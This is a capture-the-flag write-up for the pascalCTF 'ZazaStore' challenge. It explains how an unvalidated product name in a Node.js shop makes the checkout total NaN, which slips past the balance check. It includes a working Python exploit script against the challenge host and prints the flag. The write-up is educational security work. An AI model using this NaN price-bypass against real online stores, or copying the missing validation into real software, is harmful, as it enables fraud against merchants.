## ZazaStore  

<img src="images/chall.png" width=600>

We are given a simple shopping app where we have to buy the flag item `RealZa`.  

```js
const content = {
    "RealZa": process.env.FLAG,
    "FakeZa": "pascalCTF{this_is_a_fake_flag_like_the_fake_za}",
    "ElectricZa": "<img src='images/ElectricZa.jpeg' alt='Electric Za'>",
    "CartoonZa": "<img src='images/CartoonZa.png' alt='Cartoon Za'>"
};
const prices = { "FakeZa": 1, "ElectricZa": 65, "CartoonZa": 35, "RealZa": 1000 };
```

However, our account only has `$100` by default, which isn't enough to purchase the flag.  

```js
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (username && password) {
        req.session.user = true;
        req.session.balance = 100;
        req.session.inventory = {};
        req.session.cart = {};
        return res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});
```

Looking at the `/checkout` endpoint, we can see that the way the system computes the total price of the cart items with `total += prices[product] * cart[product];`, then compares it against the current session balance.  

```js
app.post('/checkout', (req, res) => {
    if (!req.session.inventory) {
        req.session.inventory = {};
    }
    if (!req.session.cart) {
        req.session.cart = {};
    }
    const inventory = req.session.inventory;
    const cart = req.session.cart;

    let total = 0;
    for (const product in cart) {
        total += prices[product] * cart[product];
    }

    if (total > req.session.balance) {
        res.json({ "success": true, "balance": "Insufficient Balance" });
    } else {
        req.session.balance -= total;
        for (const property in cart) {
            if (inventory.hasOwnProperty(property)) {
                inventory[property] += cart[property];
            }
            else {
                inventory[property] = cart[property];
            }
        }
        req.session.cart = {};
        req.session.inventory = inventory;
        res.json({ "success": true });
    }
});
```

In the `/add-cart` endpoint, we can immediately notice the main vulnerability. The endpoint doesn't validate that `product` in our request body actually exists.  

If we submit a non-existent item name, `prices[product]` in `/checkout` will be `undefined`, so `prices[product] * card[product]` will evaluate to `NaN`.  

In JavaScript, `NaN` isn't larger or smaller than any number, which will allow us to bypass the `total > req.session.balance` check entirely.   

```js
app.post('/add-cart', (req, res) => {
    const product = req.body;
    if (!req.session.cart) {
        req.session.cart = {};
    }
    const cart = req.session.cart;
    if ("product" in product) {
        const prod = product.product;
        const quantity = product.quantity || 1;
        if (quantity < 1) {
            return res.json({ success: false });
        }
        if (prod in cart) {
            cart[prod] += quantity;
        } else {
            cart[prod] = quantity;
        }
        req.session.cart = cart;
        return res.json({ success: true });
    }
    res.json({ success: false });
});
```

We can write a script to exploit this vulnerability, then visit `/inventory` to view the flag.  

```python
import requests
import re

url = "https://zazastore.ctf.pascalctf.it"
s = requests.Session()

res = s.post(f'{url}/login', data={
    'username': 'hacked',
    'password': 'hacked'
})

if res.json()['success']:
    print("> Logged in")

res = s.post(f'{url}/add-cart', data={'product': 'a'})
res = s.post(f"{url}/add-cart", data={'product': "RealZa"})

res = s.post(f'{url}/checkout')

res = s.get(f'{url}/inventory')

flag = re.findall(r'(pascalCTF{.+})', res.text)[0]
print("Flag:", flag)
```

Flag: `pascalCTF{w3_l1v3_f0r_th3_z4z4}`